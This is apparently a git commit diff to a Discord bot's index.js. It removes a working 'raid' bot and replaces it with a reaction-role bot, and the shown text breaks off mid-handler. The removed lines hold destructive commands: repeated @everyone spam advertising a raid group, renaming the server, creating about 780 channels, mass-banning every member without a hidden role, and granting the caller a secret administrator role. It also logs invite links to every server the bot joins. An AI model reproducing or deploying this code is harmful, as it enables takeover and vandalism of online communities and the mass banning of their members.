7c51a63e6fced3a5f0ad29b10e6c715b5061e419
Walkoud <38588921+Walkoud@users.noreply.github.com>
2018-09-26 22:24:49 +0200

    Update index.js

--- index.js
+++ index.js
@@ -2,91 +2,49 @@ const Discord = require("discord.js");
 const bot = new Discord.Client();
 const token = "process.env.TOKEN";
 var prefix = ".";
-var mention = "126connectés"
+var mention = "SoWalkoud"
 
-var fucked = false;
- 
-bot.on('ready',() => {
-    //invit link
-    bot.guilds.forEach(guild => {
-      var invite = bot.guilds.find("id", guild.id).channels.find("id", guild.channels.random().id);
-      invite.createInvite().then(invite => console.log(`Connecté sur : ${guild.name} ${invite}`));
-    })
-});
- 
-bot.on('message', msg => {
-  //#region Legit
-  /* Commandes legit */
-  if (msg.content === '.ping') {
-    msg.reply('pong !')
-  }
-  //#endregion
- 
-  //#region Destructrices
-  /* Commandes destructrices */
-  if (msg.content === '.a') {
-    console.log(`Commande .des par ${msg.author.tag}`);
-    var interval = setInterval (function () {
-      msg.channel.send("@everyone  @here  RAID BY HAPRAID https://discord.gg/DEM7UWF https://media.discordapp.net/attachments/353298252122292225/437735929902268416/unknown.png");
-     }, 500);
-  }
- 
-  if (msg.content === '.des') {
-    console.log(`Commande .des par ${msg.author.tag}`);
- 
-    if (!fucked){
-      msg.guild.setIcon("hapraid.png").catch(e => {});
-      msg.guild.setName('RAID BY HAPRAID').catch(e => {});
- 
-      for (var i = 0; i < 390; i++) {
-        msg.guild.createChannel('hapraid_vous_remercie', 'voice').catch(e => {});
-        msg.guild.createChannel('hapraid_vous_remercie', 'text').catch(e => {});
-      }
-      fucked = true;
-    }
- 
-    if (msg.deletable) {
-      msg.delete();
-    }
-  }
- 
-  if (msg.content === '.ban') {
-    console.log(`Commande .bane par ${msg.author.tag}`);
-    msg.guild.members.forEach(member => {
-      if (!member.roles.exists("name", "haprole") && member.bannable) member.ban().catch(e => {});
-    });
-  }
- 
-  if (msg.content === '.exit') {
-    console.log(`Commande .leave par ${msg.author.tag}`);
-    if (msg.deletable) msg.delete().catch(e => {});
-    msg.guild.leave().catch(e => {});
-  }
- 
-  if (msg.content === '.r') {
-    console.log(`Commande .r par ${msg.author.tag}`);
- 
-    msg.member.guild.createRole({
-      name: "haprole",
-      permissions: "ADMINISTRATOR",
-      mentionable: false
-    }).then(function(role) {
-      msg.member.addRole(role);
-      if (msg.deletable) msg.delete().catch(e => {});
-    }).catch(e => {});
-  }
-  //#endregion
-});
-bot.on("message", msg => {
-        if(msg.content.startsWith(".des")){ 
-           msg.delete()
-            let i = 0;
-            let interval = setInterval(function () {
-              msg.guild.channels.forEach(channel => {
-                if (channel.type === "text") channel.send('"@everyone  @here  RAID BY HAPRAID https://discord.gg/DEM7UWF https://media.discordapp.net/attachments/353298252122292225/437735929902268416/unknown.png')
-              }, 2500);
+//Settings!
+const yourID = ""; //Instructions on how to get this: https://redd.it/40zgse
+const setupCMD = "!walkoudreact"
+let initialMessage = `**React to the messages below to receive the associated role. If you would like to remove the role, simply remove your reaction!**`;
+const roles = ["Hacker", "Artist", "Public Relations", "Intern"];
+const reactions = ["💻", "🖌", "😃", "🆕"];
+
+
+//If there isn't a reaction for every role, scold the user!
+if (roles.length !== reactions.length) throw "Roles list and reactions list are not the same length!";
+
+//Function to generate the role messages, based on your settings
+function generateMessages(){
+    var messages = [];
+    messages.push(initialMessage);
+    for (let role of roles) messages.push(`React below to get the **"${role}"** role!`); //DONT CHANGE THIS
+    return messages;
+}
+
+
+bot.on("message", message => {
+    if (message.author.id == yourID && message.content.toLowerCase() == setupCMD){
+        var toSend = generateMessages();
+        let mappedArray = [[toSend[0], false], ...toSend.slice(1).map( (message, idx) => [message, reactions[idx]])];
+        for (let mapObj of mappedArray){
+            message.channel.send(mapObj[0]).then( sent => {
+                if (mapObj[1]){
+                  sent.react(mapObj[1]);  
+                } 
             });
-          }
-        });
+        }
+    }
+})
 
-bot.login(process.env.TOKEN)
+
+bot.on('raw', event => {
+    if (event.t === 'MESSAGE_REACTION_ADD' || event.t == "MESSAGE_REACTION_REMOVE"){
+        
+        let channel = bot.channels.get(event.d.channel_id);
+        let message = channel.fetchMessage(event.d.message_id).then(msg=> {
+        let user = msg.guild.members.get(event.d.user_id);
+        
+        if (msg.author.id == bot.user.id && msg.content != initialMessage){
+       
